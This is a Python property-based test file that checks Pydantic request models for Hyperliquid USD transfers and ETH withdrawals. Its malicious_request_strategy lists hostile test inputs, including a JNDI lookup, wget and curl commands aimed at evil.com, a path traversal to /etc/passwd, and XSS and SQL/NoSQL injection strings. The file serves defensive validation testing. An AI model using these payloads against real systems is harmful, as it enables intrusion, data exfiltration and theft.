"""Property-based tests for Hyperliquid raw API request payload models.

These tests validate critical security boundary models that process external API request data.
The models tested are essential for transfers, withdrawals, and action payload validation.

SECURITY CRITICAL: These raw models protect against:
- Malicious request data that could manipulate transfer/withdrawal operations
- Financial precision errors in amount and address validation
- Buffer overflow attacks through oversized request structures
- Injection attacks through malformed request payloads
- Address manipulation that could redirect transfers to attacker wallets
- Amount manipulation that could cause incorrect transfer values

Property testing ensures comprehensive coverage of request edge cases and adversarial inputs.
"""

import string
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_api_request_payloads import (
    HyperliquidApiEthWithdrawalRequest,
    HyperliquidApiL2UsdTransferRequest,
)
from cyberdelta.apis.hyperliquid.models.hl_raw_exchange_actions import (
    HyperliquidRawEthWithdrawalActionPayload,
    HyperliquidRawL2UsdTransferActionDetails,
)
from cyberdelta.apis.hyperliquid.models.hl_raw_transfer_withdrawal import (
    HyperliquidRawL2UsdTransferPayload,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for malicious input types to avoid long lines
MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None


# =============================================================================
# HYPOTHESIS STRATEGIES FOR API REQUEST PAYLOAD MODEL TESTING
# =============================================================================


def _create_hex_address(hex_part: str) -> str:
    """Create hex address with 0x prefix.

    Args:
        hex_part: Hex string without prefix.

    Returns:
        Hex address with 0x prefix.
    """
    return f"0x{hex_part}"


def ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses.

    Returns:
        SearchStrategy[str]: Strategy for generating valid Ethereum addresses.
    """
    return st.one_of([
        # Common test addresses
        st.sampled_from([
            "0x1234567890abcdef1234567890abcdef12345678",
            "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
            "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
            "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
            "0x0000000000000000000000000000000000000000",
            "0xffffffffffffffffffffffffffffffffffffffff",
        ]),
        # Generated addresses
        st.builds(
            _create_hex_address,
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def token_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid token symbols.

    Returns:
        SearchStrategy[str]: Strategy for generating valid token symbols.
    """
    return st.sampled_from([
        "USDC",
        "USDT",
        "DAI",
        "BUSD",
        "ETH",
        "BTC",
        "SOL",
        "AVAX",
        "MATIC",
        "ARB",
        "OP",
    ])


def positive_decimal_strategy() -> SearchStrategy[str]:
    """Generate positive decimal strings for amounts.

    Returns:
        SearchStrategy[str]: Strategy for generating positive decimal strings.
    """
    return st.one_of([
        # Common positive amounts
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0.01"),  # Small amount
        st.just("1.0"),  # Unit amount
        st.just("100.0"),  # Standard amount
        st.just("1234.56"),  # Common format
        st.just("50000.123456"),  # High-precision
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def finite_decimal_strategy() -> SearchStrategy[str]:
    """Generate finite decimal strings (can be negative).

    Returns:
        SearchStrategy[str]: Strategy for generating finite decimal strings.
    """
    return st.one_of([
        # Positive and negative amounts
        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0"),  # Zero
        st.just("1.0"),  # Positive
        st.just("-1.0"),  # Negative
        st.just("100.0"),
        st.just("-100.0"),
        st.just("1234.56"),
        st.just("-1234.56"),
        # Scientific notation
        st.just("1e2"),
        st.just("-1e2"),
    ])


@st.composite
def valid_l2_usd_transfer_payload_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid L2 USD transfer payload data.

    Returns:
        dict[str, Any]: Valid L2 USD transfer payload data.
    """
    return {
        "destination": draw(ethereum_address_strategy()),
        "token": draw(token_symbol_strategy()),
        "amount": draw(positive_decimal_strategy()),
    }


@st.composite
def valid_l2_usd_transfer_action_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid L2 USD transfer action data.

    Returns:
        dict[str, Any]: Valid L2 USD transfer action data.
    """
    return {
        "chain": "L2",
        "payload": draw(valid_l2_usd_transfer_payload_data()),
    }


@st.composite
def valid_l2_usd_transfer_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid L2 USD transfer request data.

    Returns:
        dict[str, Any]: Valid L2 USD transfer request data.
    """
    return {
        "type": "usdTransfer",
        "action": draw(valid_l2_usd_transfer_action_data()),
    }


@st.composite
def valid_eth_withdrawal_action_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid ETH withdrawal action data.

    Returns:
        dict[str, Any]: Valid ETH withdrawal action data.
    """
    return {
        "destination": draw(ethereum_address_strategy()),
        "amount": draw(finite_decimal_strategy()),
    }


@st.composite
def valid_eth_withdrawal_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid ETH withdrawal request data.

    Returns:
        dict[str, Any]: Valid ETH withdrawal request data.
    """
    return {
        "type": "withdrawEth",
        "action": draw(valid_eth_withdrawal_action_data()),
    }


def malicious_request_strategy() -> SearchStrategy[MaliciousInput]:
    """Generate malicious values for API request security testing.

    Returns:
        SearchStrategy[str]: Strategy for generating test data.
    """
    return st.one_of([
        # API request manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-requests}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('request-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE transfers;--"),
        st.just("1' UNION SELECT * FROM wallets--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("R" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.transfers.find(); //"),
        # JSON injection
        st.just('{"$where": "this.amount > 1000000"}'),
        # Address manipulation
        st.just("0x'; UPDATE transfers SET destination='evil';--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID API L2 USD TRANSFER REQUEST MODEL
# =============================================================================


class TestHyperliquidApiL2UsdTransferRequestProperties:
    """Property-based tests for HyperliquidApiL2UsdTransferRequest validation and security."""

    @given(request_data=valid_l2_usd_transfer_request_data())
    def test_l2_usd_transfer_validation_success_properties(
        self, request_data: dict[str, Any]
    ) -> None:
        """Property: Valid L2 USD transfer request data should create valid request objects."""
        # Skip invalid data
        try:
            action_data = request_data["action"]
            payload_data = action_data["payload"]

            # Validate address
            assume(
                isinstance(payload_data["destination"], str)
                and payload_data["destination"].startswith("0x")
            )
            assume(len(payload_data["destination"]) == 42)

            # Validate amount
            amount_str = payload_data["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite() and decimal_val > 0)

            # Validate token
            assume(isinstance(payload_data["token"], str) and payload_data["token"].strip())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Create models step by step to ensure proper validation
        payload_model = HyperliquidRawL2UsdTransferPayload.model_validate(
            request_data["action"]["payload"]
        )
        action_model = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=payload_model)
        obj = HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=action_model)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidApiL2UsdTransferRequest)
        assert obj.type == "usdTransfer"
        assert obj.action.chain == "L2"
        assert obj.action.payload.destination == request_data["action"]["payload"]["destination"]
        assert obj.action.payload.token == request_data["action"]["payload"]["token"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["type", "action"]),
        malicious_value=malicious_request_strategy(),
    )
    def test_l2_usd_transfer_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: L2 USD transfer request should reject malicious inputs."""
        # Create valid base data
        payload_model = HyperliquidRawL2UsdTransferPayload(
            destination="0x1234567890abcdef1234567890abcdef12345678", token="USDC", amount="100.0"
        )
        action_model = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=payload_model)

        base_data: dict[str, object] = {
            "type": "usdTransfer",
            "action": action_model,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidApiL2UsdTransferRequest.model_validate(base_data)

    @given(
        invalid_amount=st.one_of([
            # Invalid amounts for positive decimal
            st.just("-100.0"),  # Negative
            st.just("0"),  # Zero
            st.just("0.0"),  # Zero
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ])
    )
    def test_l2_usd_transfer_invalid_amount_properties(self, invalid_amount: str) -> None:
        """Property: L2 USD transfer should reject invalid amounts."""
        # Property: Invalid amounts should be rejected at payload level
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawL2UsdTransferPayload(
                destination="0x1234567890abcdef1234567890abcdef12345678",
                token="USDC",
                amount=invalid_amount,
            )

    @given(
        invalid_address=st.one_of([
            st.just("invalid-address"),
            st.just("0x123"),  # Too short
            st.just("0x" + "g" * 40),  # Invalid hex
            st.just("1234567890abcdef1234567890abcdef12345678"),  # Missing 0x
            st.just("0x" + "a" * 41),  # Too long
            st.just(""),
            st.just("   "),
        ])
    )
    def test_l2_usd_transfer_invalid_address_properties(self, invalid_address: str) -> None:
        """Property: L2 USD transfer should reject invalid Ethereum addresses."""
        # Property: Invalid addresses should be rejected at payload level
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawL2UsdTransferPayload(
                destination=invalid_address, token="USDC", amount="100.0"
            )

    @given(invalid_type=st.text().filter(lambda x: x != "usdTransfer"))
    def test_l2_usd_transfer_invalid_type_properties(self, invalid_type: str) -> None:
        """Property: L2 USD transfer should only accept 'usdTransfer' as type."""
        assume(invalid_type.strip())  # Skip empty strings

        payload_model = HyperliquidRawL2UsdTransferPayload(
            destination="0x1234567890abcdef1234567890abcdef12345678", token="USDC", amount="100.0"
        )
        action_model = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=payload_model)

        # Property: Invalid type values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidApiL2UsdTransferRequest(
                type=invalid_type,  # type: ignore[arg-type]
                action=action_model,
            )

    @given(request_data=valid_l2_usd_transfer_request_data())
    def test_l2_usd_transfer_extra_fields_properties(self, request_data: dict[str, Any]) -> None:
        """Property: L2 USD transfer request should forbid extra fields."""
        # Skip invalid data (same validation as success test)
        try:
            action_data = request_data["action"]
            payload_data = action_data["payload"]
            assume(
                isinstance(payload_data["destination"], str)
                and payload_data["destination"].startswith("0x")
            )
            assume(len(payload_data["destination"]) == 42)
            amount_str = payload_data["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite() and decimal_val > 0)
        except (ValueError, TypeError, KeyError):
            assume(False)

        # Create valid models
        payload_model = HyperliquidRawL2UsdTransferPayload.model_validate(
            request_data["action"]["payload"]
        )
        action_model = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=payload_model)

        # Add extra fields to request data
        request_data_with_extra = {
            "type": "usdTransfer",
            "action": action_model,
            "extra": "forbidden",
            "malicious": {"nested": "data"},
        }

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidApiL2UsdTransferRequest.model_validate(request_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID API ETH WITHDRAWAL REQUEST MODEL
# =============================================================================


class TestHyperliquidApiEthWithdrawalRequestProperties:
    """Property-based tests for HyperliquidApiEthWithdrawalRequest validation and security."""

    @given(request_data=valid_eth_withdrawal_request_data())
    def test_eth_withdrawal_validation_success_properties(
        self, request_data: dict[str, Any]
    ) -> None:
        """Property: Valid ETH withdrawal request data should create valid request objects."""
        # Skip invalid data
        try:
            action_data = request_data["action"]

            # Validate address
            assume(
                isinstance(action_data["destination"], str)
                and action_data["destination"].startswith("0x")
            )
            assume(len(action_data["destination"]) == 42)

            # Validate amount
            amount_str = action_data["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Create models step by step to ensure proper validation
        action_model = HyperliquidRawEthWithdrawalActionPayload.model_validate(
            request_data["action"]
        )
        obj = HyperliquidApiEthWithdrawalRequest(type="withdrawEth", action=action_model)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidApiEthWithdrawalRequest)
        assert obj.type == "withdrawEth"
        assert obj.action.destination == request_data["action"]["destination"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["type", "action"]),
        malicious_value=malicious_request_strategy(),
    )
    def test_eth_withdrawal_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousInput
    ) -> None:
        """Property: ETH withdrawal request should reject malicious inputs."""
        # Create valid base data
        action_model = HyperliquidRawEthWithdrawalActionPayload(
            destination="0x1234567890abcdef1234567890abcdef12345678", amount="1.0"
        )

        base_data: dict[str, object] = {
            "type": "withdrawEth",
            "action": action_model,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidApiEthWithdrawalRequest.model_validate(base_data)

    @given(
        invalid_amount=st.one_of([
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
            st.just("1..0"),
        ])
    )
    def test_eth_withdrawal_invalid_amount_properties(self, invalid_amount: str) -> None:
        """Property: ETH withdrawal should reject invalid amounts."""
        # Property: Invalid amounts should be rejected at action level
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawEthWithdrawalActionPayload(
                destination="0x1234567890abcdef1234567890abcdef12345678", amount=invalid_amount
            )

    @given(
        invalid_address=st.one_of([
            st.just("invalid-address"),
            st.just("0x123"),  # Too short
            st.just("0x" + "g" * 40),  # Invalid hex
            st.just("1234567890abcdef1234567890abcdef12345678"),  # Missing 0x
            st.just("0x" + "a" * 41),  # Too long
            st.just(""),
            st.just("   "),
        ])
    )
    def test_eth_withdrawal_invalid_address_properties(self, invalid_address: str) -> None:
        """Property: ETH withdrawal should reject invalid Ethereum addresses."""
        # Property: Invalid addresses should be rejected at action level
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawEthWithdrawalActionPayload(destination=invalid_address, amount="1.0")

    @given(invalid_type=st.text().filter(lambda x: x != "withdrawEth"))
    def test_eth_withdrawal_invalid_type_properties(self, invalid_type: str) -> None:
        """Property: ETH withdrawal should only accept 'withdrawEth' as type."""
        assume(invalid_type.strip())  # Skip empty strings

        action_model = HyperliquidRawEthWithdrawalActionPayload(
            destination="0x1234567890abcdef1234567890abcdef12345678", amount="1.0"
        )

        # Property: Invalid type values should be rejected
        with pytest.raises(ValidationError):
            HyperliquidApiEthWithdrawalRequest(
                type=invalid_type,  # type: ignore[arg-type]
                action=action_model,
            )

    @given(request_data=valid_eth_withdrawal_request_data())
    def test_eth_withdrawal_extra_fields_properties(self, request_data: dict[str, Any]) -> None:
        """Property: ETH withdrawal request should forbid extra fields."""
        # Skip invalid data (same validation as success test)
        try:
            action_data = request_data["action"]
            assume(
                isinstance(action_data["destination"], str)
                and action_data["destination"].startswith("0x")
            )
            assume(len(action_data["destination"]) == 42)
            amount_str = action_data["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite())
        except (ValueError, TypeError, KeyError):
            assume(False)

        # Create valid models
        action_model = HyperliquidRawEthWithdrawalActionPayload.model_validate(
            request_data["action"]
        )

        # Add extra fields to request data
        request_data_with_extra = {
            "type": "withdrawEth",
            "action": action_model,
            "extra": "forbidden",
            "wallet": "malicious_wallet",
        }

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidApiEthWithdrawalRequest.model_validate(request_data_with_extra)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidApiRequestPayloadIntegrationProperties:
    """Integration property tests for API request payload models working together."""

    @given(
        l2_request_data=valid_l2_usd_transfer_request_data(),
        eth_request_data=valid_eth_withdrawal_request_data(),
        malicious_payload=malicious_request_strategy(),
    )
    def test_request_models_integration_properties(
        self,
        l2_request_data: dict[str, Any],
        eth_request_data: dict[str, Any],
        malicious_payload: MaliciousInput,
    ) -> None:
        """Property: Request models should work consistently together."""
        # Skip invalid data for L2 request
        try:
            l2_action = l2_request_data["action"]
            l2_payload = l2_action["payload"]
            assume(
                isinstance(l2_payload["destination"], str)
                and l2_payload["destination"].startswith("0x")
            )
            assume(len(l2_payload["destination"]) == 42)
            amount_str = l2_payload["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite() and decimal_val > 0)
        except (ValueError, TypeError, KeyError):
            assume(False)

        # Skip invalid data for ETH request
        try:
            eth_action = eth_request_data["action"]
            assume(
                isinstance(eth_action["destination"], str)
                and eth_action["destination"].startswith("0x")
            )
            assume(len(eth_action["destination"]) == 42)
            amount_str = eth_action["amount"]
            assume(isinstance(amount_str, str) and amount_str.strip())
            decimal_val = Decimal(amount_str)
            assume(decimal_val.is_finite())
        except (ValueError, TypeError, KeyError):
            assume(False)

        # Property: Valid data should create valid objects
        l2_payload_model = HyperliquidRawL2UsdTransferPayload.model_validate(
            l2_request_data["action"]["payload"]
        )
        l2_action_model = HyperliquidRawL2UsdTransferActionDetails(
            chain="L2", payload=l2_payload_model
        )
        l2_obj = HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=l2_action_model)

        eth_action_model = HyperliquidRawEthWithdrawalActionPayload.model_validate(
            eth_request_data["action"]
        )
        eth_obj = HyperliquidApiEthWithdrawalRequest(type="withdrawEth", action=eth_action_model)

        assert isinstance(l2_obj, HyperliquidApiL2UsdTransferRequest)
        assert isinstance(eth_obj, HyperliquidApiEthWithdrawalRequest)

        # Property: Malicious payload should be rejected when injected into action
        corrupted_l2_data = l2_request_data.copy()
        corrupted_l2_data["action"]["payload"]["destination"] = malicious_payload

        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            corrupted_payload = HyperliquidRawL2UsdTransferPayload.model_validate(
                corrupted_l2_data["action"]["payload"]
            )
            corrupted_action = HyperliquidRawL2UsdTransferActionDetails(
                chain="L2", payload=corrupted_payload
            )
            HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=corrupted_action)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["type", "action"]),
            malicious_request_strategy(),
            min_size=2,
            max_size=2,
        )
    )
    def test_request_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All request models should handle adversarial input safely."""
        # Property: Complete adversarial input should be safely rejected by both models
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidApiL2UsdTransferRequest.model_validate(complete_malicious_data)

        with pytest.raises((ValidationError, TypeError)):
            HyperliquidApiEthWithdrawalRequest.model_validate(complete_malicious_data)

    @given(
        valid_address=ethereum_address_strategy(),
        valid_amount=positive_decimal_strategy(),
        valid_token=token_symbol_strategy(),
    )
    def test_request_financial_calculations_properties(
        self, valid_address: str, valid_amount: str, valid_token: str
    ) -> None:
        """Property: Request models should support accurate financial calculations."""
        # Skip invalid data
        try:
            assume(valid_address.startswith("0x") and len(valid_address) == 42)
            decimal_val = Decimal(valid_amount)
            assume(decimal_val.is_finite() and decimal_val > 0)
            assume(valid_token.strip())
        except (ValueError, TypeError):
            assume(False)

        # Test L2 USD transfer with financial calculations
        l2_payload = HyperliquidRawL2UsdTransferPayload(
            destination=valid_address, token="USDC", amount=valid_amount
        )
        l2_action = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=l2_payload)
        l2_request = HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=l2_action)

        # Property: Should be able to extract and calculate with amounts
        amount_decimal = Decimal(l2_request.action.payload.amount)
        assert amount_decimal.is_finite()
        assert amount_decimal > 0

        # Property: Financial calculations should work
        fee_rate = Decimal("0.001")  # 0.1% fee
        fee_amount = amount_decimal * fee_rate
        total_cost = amount_decimal + fee_amount
        assert fee_amount.is_finite()
        assert total_cost.is_finite()
        assert total_cost > amount_decimal


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidApiL2UsdTransferRequest_valid() -> None:
    """Test valid L2 USD transfer."""
    payload_data: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345670",  # ETH-like
        "token": "USDC",  # Added token
        "amount": "100.50",
    }
    payload_model = HyperliquidRawL2UsdTransferPayload(**payload_data)
    action_details_model = HyperliquidRawL2UsdTransferActionDetails(
        chain="L2",
        payload=payload_model,
    )

    req = HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=action_details_model)
    assert req.type == "usdTransfer"
    assert req.action.chain == "L2"
    assert req.action.payload.destination == "0x1234567890abcdef1234567890abcdef12345670"
    assert req.action.payload.amount == "100.50"
    assert req.action.payload.token == "USDC"


def test_HyperliquidApiL2UsdTransferRequest_invalid_amount() -> None:
    """Test L2 USD transfer invalid payload values."""
    payload_data: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345670",
        "token": "USDC",
        "amount": "-100.50",  # Invalid amount (RawPositiveFiniteDecimalStr)
    }
    with pytest.raises(ValidationError):
        payload_model = HyperliquidRawL2UsdTransferPayload(**payload_data)
        action_details_model = HyperliquidRawL2UsdTransferActionDetails(
            chain="L2",
            payload=payload_model,
        )
        HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=action_details_model)


def test_HyperliquidApiL2UsdTransferRequest_missing_amount() -> None:
    """Test L2 USD transfer missing amount in payload."""
    payload_data: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345670",
        "token": "USDC",
        # "amount" is missing
    }
    with pytest.raises(ValidationError):
        # Pydantic should raise when HyperliquidRawL2UsdTransferPayload is instantiated
        payload_model = HyperliquidRawL2UsdTransferPayload(**payload_data)
        action_details_model = HyperliquidRawL2UsdTransferActionDetails(
            chain="L2",
            payload=payload_model,
        )
        HyperliquidApiL2UsdTransferRequest(type="usdTransfer", action=action_details_model)


def test_HyperliquidApiL2UsdTransferRequest_explicit_type() -> None:
    """Test L2 USD transfer explicit type provided direct unpack."""
    # For direct unpacking, ensure inner models are instantiated correctly
    # or the dict is precise
    payload_dict: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345670",
        "token": "USDC",
        "amount": "100.50",
    }
    # Instantiate inner models explicitly if **request_data is problematic
    payload_model = HyperliquidRawL2UsdTransferPayload(**payload_dict)
    action_details_model = HyperliquidRawL2UsdTransferActionDetails(
        chain="L2",
        payload=payload_model,
    )

    request_data_for_unpack: dict[str, Any] = {
        "type": "usdTransfer",
        "action": action_details_model,  # Pass the model instance
    }
    req = HyperliquidApiL2UsdTransferRequest.model_validate(request_data_for_unpack)
    assert req.type == "usdTransfer"
    assert req.action.chain == "L2"
    assert req.action.payload.destination == "0x1234567890abcdef1234567890abcdef12345670"
    assert req.action.payload.amount == "100.50"
    assert req.action.payload.token == "USDC"


def test_HyperliquidApiL2UsdTransferRequest_incorrect_type() -> None:
    """Test L2 USD transfer incorrect outer type."""
    payload_dict: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345670",
        "token": "USDC",
        "amount": "100.50",
    }
    payload_model = HyperliquidRawL2UsdTransferPayload(**payload_dict)
    action_details_model = HyperliquidRawL2UsdTransferActionDetails(
        chain="L2",
        payload=payload_model,
    )

    request_data_for_unpack: dict[str, Any] = {
        "type": "wrongUsdTransferType",  # Incorrect type
        "action": action_details_model,
    }
    with pytest.raises(ValidationError):
        HyperliquidApiL2UsdTransferRequest.model_validate(request_data_for_unpack)


def test_HyperliquidApiEthWithdrawalRequest_valid() -> None:
    """Test valid ETH withdrawal."""
    action_payload_data: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345678",
        "amount": "1.234",
    }
    action_model = HyperliquidRawEthWithdrawalActionPayload(**action_payload_data)
    req = HyperliquidApiEthWithdrawalRequest(type="withdrawEth", action=action_model)
    assert req.type == "withdrawEth"
    assert req.action.destination == "0x1234567890abcdef1234567890abcdef12345678"
    assert req.action.amount == "1.234"


def test_HyperliquidApiEthWithdrawalRequest_invalid_address() -> None:
    """Test ETH withdrawal invalid address."""
    action_payload_data: dict[str, Any] = {
        "destination": "invalid-eth-address",  # Expected to fail RawStrictEthereumAddressStrHL
        "amount": "1.234",
    }
    with pytest.raises(ValidationError):
        action_model = HyperliquidRawEthWithdrawalActionPayload(**action_payload_data)
        HyperliquidApiEthWithdrawalRequest(type="withdrawEth", action=action_model)


def test_HyperliquidApiEthWithdrawalRequest_invalid_amount() -> None:
    """Test ETH withdrawal invalid amount."""
    action_payload_data: dict[str, Any] = {
        "destination": "0x1234567890abcdef1234567890abcdef12345678",
        "amount": "not-a-number",  # Expected to fail RawFiniteDecimalStr
    }
    with pytest.raises(ValidationError):
        action_model = HyperliquidRawEthWithdrawalActionPayload(**action_payload_data)
        HyperliquidApiEthWithdrawalRequest(type="withdrawEth", action=action_model)


def test_HyperliquidApiEthWithdrawalRequest_explicit_type() -> None:
    """Test ETH withdrawal explicit type provided direct unpack."""
    action_payload_model = HyperliquidRawEthWithdrawalActionPayload(
        destination="0x1234567890abcdef1234567890abcdef12345678",
        amount="1.234",
    )
    request_data_for_unpack: dict[str, Any] = {
        "type": "withdrawEth",
        "action": action_payload_model,  # Pass the model instance
    }
    req = HyperliquidApiEthWithdrawalRequest.model_validate(request_data_for_unpack)
    assert req.type == "withdrawEth"
    assert req.action.destination == "0x1234567890abcdef1234567890abcdef12345678"
    assert req.action.amount == "1.234"


def test_HyperliquidApiEthWithdrawalRequest_incorrect_type() -> None:
    """Test ETH withdrawal incorrect outer type."""
    action_payload_model = HyperliquidRawEthWithdrawalActionPayload(
        destination="0x1234567890abcdef1234567890abcdef12345678",
        amount="1.234",
    )
    request_data_for_unpack: dict[str, Any] = {
        "type": "wrongWithdrawType",  # Incorrect type
        "action": action_payload_model,
    }
    with pytest.raises(ValidationError):
        HyperliquidApiEthWithdrawalRequest.model_validate(request_data_for_unpack)
